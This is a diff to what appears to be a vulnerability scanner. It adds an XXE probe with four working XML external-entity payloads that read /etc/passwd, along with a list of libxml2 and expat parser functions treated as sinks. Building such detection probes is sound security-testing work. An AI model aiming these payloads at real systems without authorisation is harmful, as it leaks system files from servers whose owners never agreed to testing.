@@ -78,6 +78,18 @@ def traversal_confirm(out: bytes, payload: bytes, marker: str) -> bool:
     return re.search(rb"root:.?:0:0:", out) is not None or b"root:x:0:" in out
 
 
+def xxe_payloads(marker=None):
+    """XML external-entity file-disclosure documents: a SYSTEM entity pointing at /etc/passwd, in a
+    few DTD/entity forms. Confirmed by the file's content coming back (same oracle as traversal)."""
+    return [
+        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "/etc/passwd">]><r>&xxe;</r>',
+        b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+        b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd">'
+        b'<!ENTITY xxe "%p;">]><r>&xxe;</r>',
+    ]
+
+
 # name -> {cwe, severity, sinks, payloads(marker)->list, confirm(out,payload,marker)->bool, title}
 PROBES = {
     "command-injection": {
@@ -96,6 +108,15 @@ PROBES = {
         "sinks": {"fopen", "fopen64", "open", "open64", "freopen"},
         "payloads": lambda m: traversal_payloads(), "confirm": traversal_confirm,
         "title": "Path traversal", "binary": True},
+    "xxe": {
+        "cwe": "CWE-611", "severity": "high",
+        # libxml2 / libexpat document-parse entry points. Entity substitution must be enabled for
+        # the disclosure to fire (XML_PARSE_NOENT); a target with it off simply never confirms.
+        "sinks": {"xmlReadMemory", "xmlReadFile", "xmlReadDoc", "xmlReadFd", "xmlParseMemory",
+                  "xmlParseFile", "xmlParseDoc", "xmlCtxtReadMemory", "xmlCtxtReadFile",
+                  "xmlCtxtReadDoc", "xmlParseDocument", "XML_Parse"},
+        "payloads": lambda m: xxe_payloads(m), "confirm": traversal_confirm,
+        "title": "XML external entity (XXE)", "binary": True},
     "sql-injection": {
         "cwe": "CWE-89", "severity": "critical",
         # the query-string sinks (sqlite / mysql / postgres). A prepared-statement API that binds
